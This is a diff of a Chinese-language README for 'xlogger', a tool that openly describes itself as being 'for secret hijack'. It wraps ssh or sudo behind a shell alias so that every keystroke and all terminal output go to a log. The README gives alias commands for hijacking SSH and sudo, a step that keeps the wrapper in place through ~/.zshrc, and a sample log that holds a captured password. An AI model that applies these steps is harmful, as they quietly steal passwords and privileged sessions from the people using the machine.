@@ -1,20 +1,8 @@
 # xlogger
 
-记录目标程序的所有键盘输入和终端输入输出的日志。
+记录目标程序的所有键盘输入和终端输出日志。
 
 You know, For secret hijack。
-
-```
-#define TARGET_PROGRAM "/usr/bin/sudo"
-alias sudo='/opt/xlogger'
-sudo -s
-
-
-#define TARGET_PROGRAM "/usr/bin/ssh"
-alias sudo='/opt/xlogger'
-ssh root@ssh.server.svc.local
-```
-
 
 ## 编译
 
@@ -22,37 +10,80 @@ ssh root@ssh.server.svc.local
 make
 ```
 
-## 选项
+## 用法
 
-在 `xlogger.c` 文件中可以修改以下配置：
+### 劫持 SSH
 
-### 目标程序配置
-```c
-#define TARGET_PROGRAM "/path/to/your/program"
-#define LOG_FILE "/tmp/xlogger.log"
+```bash
+export XPROGRAM="/usr/bin/ssh"
+export XLOGFILE="$HOME/ssh_logger.log"
+alias ssh='/path/to/xlogger'
+ssh root@server.example.com
 ```
 
-例如：
-- SSH: `#define TARGET_PROGRAM "/usr/bin/ssh"`
-- Sudo: `#define TARGET_PROGRAM "/usr/bin/sudo"`
+### 劫持 Sudo
 
-### 记录控制
-```c
-static int log_keyboard_input = 1;   // 1=记录键盘输入, 0=不记录
-static int log_console_output = 1;   // 1=记录控制台输出, 0=不记录
+```bash
+export XPROGRAM="/usr/bin/sudo"
+export XLOGFILE="$HOME/sudo_logger.log"
+alias sudo='/path/to/xlogger'
+sudo -s
 ```
 
-配置示例：
-- 只记录输入：`log_keyboard_input = 1; log_console_output = 0;`
-- 只记录输出：`log_keyboard_input = 0; log_console_output = 1;`
-- 都不记录：`log_keyboard_input = 0; log_console_output = 0;`（程序仍正常运行）
+### 写入 ~/.zshrc 持久化
+
+```bash
+# xlogger: wrap ssh to log keyboard input and console output
+export XPROGRAM="/usr/bin/ssh"
+export XLOGFILE="$HOME/ssh_logger.log"
+export XLOGINPUT=1
+export XLOGOUTPUT=1
+alias ssh='/path/to/xlogger'
+```
+
+## 环境变量
+
+所有配置通过环境变量在运行时控制，无需重新编译：
+
+| 环境变量 | 说明 | 默认值 |
+|---|---|---|
+| `XPROGRAM` | 被包装的目标程序路径 | `/usr/bin/sudo` |
+| `XLOGFILE` | 日志文件路径 | `.xlogger.log` |
+| `XLOGINPUT` | 是否记录键盘输入（`1`=是，`0`=否） | `1` |
+| `XLOGOUTPUT` | 是否记录终端输出（`1`=是，`0`=否） | `1` |
+
+### 示例
+
+```bash
+# 只记录键盘输入，不记录终端输出
+export XLOGINPUT=1
+export XLOGOUTPUT=0
+
+# 只记录终端输出，不记录键盘输入
+export XLOGINPUT=0
+export XLOGOUTPUT=1
+
+# 自定义日志路径
+export XLOGFILE="/var/log/ssh_audit.log"
+```
 
 ## 日志格式
 
-日志保存在 `xlogger.log` 文件中，格式如下：
+日志保存在 `XLOGFILE` 指定的文件中（默认 `.xlogger.log`），格式如下：
 
 ```
-[2023-12-07 10:30:15] INPUT: username\n
-[2023-12-07 10:30:16] OUTPUT: Password: 
-[2023-12-07 10:30:20] INPUT: 123456\n
+
+=== New session started: /usr/bin/ssh ===
+Arg[1]: root@server.example.com
+=====================================
+[2026-07-14 10:30:15] INPUT: root@server.example.com
+[2026-07-14 10:30:16] OUTPUT: Password: 
+[2026-07-14 10:30:20] INPUT: my-secret-password
+=== Session ended with status: 0 ===
+
 ```
+
+- 每行带时间戳
+- `INPUT` 记录键盘输入，`OUTPUT` 记录终端输出
+- 不可打印字符以 `\xNN`、`\t`、`\n`、`\r` 等形式转义
+- 每个会话以 `=== New session started ===` 开始，`=== Session ended ===` 结束
